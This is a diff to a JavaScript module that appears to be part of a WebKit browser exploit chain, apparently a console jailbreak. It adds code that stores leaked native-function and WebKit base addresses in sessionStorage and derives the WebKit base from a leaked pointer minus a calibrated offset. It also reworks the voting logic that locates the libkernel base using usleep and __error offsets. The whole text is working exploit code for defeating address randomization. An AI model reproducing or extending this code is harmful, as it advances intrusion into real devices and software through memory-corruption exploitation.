@@ -67,6 +67,54 @@ function parseAddrSync(raw) {
     return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
 }
 
+const SS_NATIVE_FN = "wk-nativeFn";
+const SS_WEBKIT_BASE = "wk-webkitBase";
+const SS_CALIBRATED = "wk-calibrated";
+const SS_CAL_CANDIDATE = "wk-cal-candidate";
+
+export function same64Ptr(a, b) {
+    if (!a || !b) return false;
+    return (a.low >>> 0) === (b.low >>> 0) && (a.hi >>> 0) === (b.hi >>> 0);
+}
+
+/** Merge wk-calibrated + wk-cal-candidate into offset table (index_rw / index_cal shared). */
+export function loadSessionOffsets(baseOff) {
+    let off = Object.assign({}, baseOff || {});
+    try {
+        const cal = sessionStorage.getItem(SS_CALIBRATED);
+        if (cal) off = Object.assign(off, JSON.parse(cal));
+    } catch (_) { }
+    try {
+        const cand = parseInt(sessionStorage.getItem(SS_CAL_CANDIDATE) || "0", 16);
+        if (cand > 0) off.wk_expm1_builtin = cand;
+    } catch (_) { }
+    return off;
+}
+
+/** Same webkit base derivation as index_rw basesFromSession — no leakval reads. */
+export function sessionBasesFromStorage(off, opts) {
+    opts = opts || {};
+    off = off || {};
+    const nativeFn = opts.nativeFn || parseAddrSync(sessionStorage.getItem(SS_NATIVE_FN));
+    let webkitBase = parseAddrSync(sessionStorage.getItem(SS_WEBKIT_BASE));
+    let derived = null;
+    if (nativeFn && off.wk_expm1_builtin)
+        derived = nativeFn.sub32(off.wk_expm1_builtin);
+    if (derived) {
+        if (!webkitBase || !same64Ptr(webkitBase, derived))
+            webkitBase = derived;
+    }
+    const libkernelBase = parseAddrSync(sessionStorage.getItem(SS_LK_BASE));
+    return { nativeFn, webkitBase, libkernelBase, derived };
+}
+
+export function persistSessionBases(nativeFn, webkitBase) {
+    try {
+        if (nativeFn) sessionStorage.setItem(SS_NATIVE_FN, String(nativeFn));
+        if (webkitBase) sessionStorage.setItem(SS_WEBKIT_BASE, String(webkitBase));
+    } catch (_) { }
+}
+
 function u64FromRead8(w) {
     if (!w) return null;
     return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
@@ -446,8 +494,12 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         const fnKey = ptrBig(fnPtr).toString(16);
 
         const zeros = calcLkFromFnPtrZeroRead(fnPtr, off);
+        let lkUs = null;
+        let lkEr = null;
         for (let zi = 0; zi < zeros.length; zi++) {
             const z = zeros[zi];
+            if (z.key === "k_usleep") lkUs = String(z.lk);
+            if (z.key === "k__error") lkEr = String(z.lk);
             const key = String(z.lk);
             let ent = lkVotes.get(key);
             if (!ent) {
@@ -457,6 +509,7 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
                     vias: [],
                     refs: [],
                     fnKeys: new Set(),
+                    dualRvaFns: new Set(),
                 };
                 lkVotes.set(key, ent);
             }
@@ -468,33 +521,43 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
             if (ent.refs.length < 6)
                 ent.refs.push(ref);
         }
+        if (lkUs && lkEr && lkUs === lkEr) {
+            const ent = lkVotes.get(lkUs);
+            if (ent) ent.dualRvaFns.add(fnKey);
+        }
     }
 
     const zeroRank = [];
     lkVotes.forEach(function (ent) {
         ent.distinctFn = ent.fnKeys ? ent.fnKeys.size : 0;
+        ent.dualRva = ent.dualRvaFns ? ent.dualRvaFns.size : 0;
         zeroRank.push(ent);
     });
     zeroRank.sort(function (a, b) {
-        return b.distinctFn - a.distinctFn
+        return b.dualRva - a.dualRva
+            || b.distinctFn - a.distinctFn
             || b.count - a.count
             || b.vias.length - a.vias.length;
     });
 
     for (let ri = 0; ri < zeroRank.length; ri++) {
         const cand = zeroRank[ri];
-        if (cand.count < minVotes) continue;
-        if (cand.distinctFn < minDistinctFn) continue;
+        const dualOk = cand.dualRva >= 1;
+        const distinctOk = cand.distinctFn >= minDistinctFn;
+        if (!dualOk && !distinctOk) continue;
+        if (cand.count < minVotes && !dualOk) continue;
         const v = verifyLibkernelZeroRead(cand.lk, off, { via: "zero-vote" });
         if (!v.ok) continue;
         return {
             ok: true,
             lk: cand.lk,
-            via: "zero-vote+" + cand.distinctFn + "fn+" + cand.count + "x"
-                + "+" + (cand.vias[0] || "?"),
-            method: "zero-vote",
+            via: dualOk
+                ? "dual-rva+" + cand.dualRva + "fn+" + cand.count + "x"
+                : "zero-vote+" + cand.distinctFn + "fn+" + cand.count + "x",
+            method: dualOk ? "dual-rva" : "zero-vote",
             vote: cand.count,
             distinctFn: cand.distinctFn,
+            dualRva: cand.dualRva,
             rank: ri,
             tried: tried,
             skipped: skipped,
@@ -552,11 +615,11 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         }
     }
 
-    let hint = "need " + minDistinctFn + "+ distinct ext ptrs → same …"
+    let hint = "need 2+ distinct ext fn ptrs OR 1 ptr where fn−usleep AND fn−error → same …"
         + (lkBaseTag(off) != null ? lkBaseTag(off).toString(16) : "c30")
-        + " (0 reads — no lk peek)";
-    if (zeroRank.length === 1 && zeroRank[0].distinctFn < 2) {
-        hint = "only 1 ext fn ptr matched — need 2+ agreeing ptrs (0-read, no lk probe)";
+        + " (0 reads)";
+    if (zeroRank.length === 1 && zeroRank[0].distinctFn < 2 && !zeroRank[0].dualRva) {
+        hint = "1 ext fn matched one RVA — need usleep+error agree on same base, or 2nd ext ptr";
     }
 
     return {
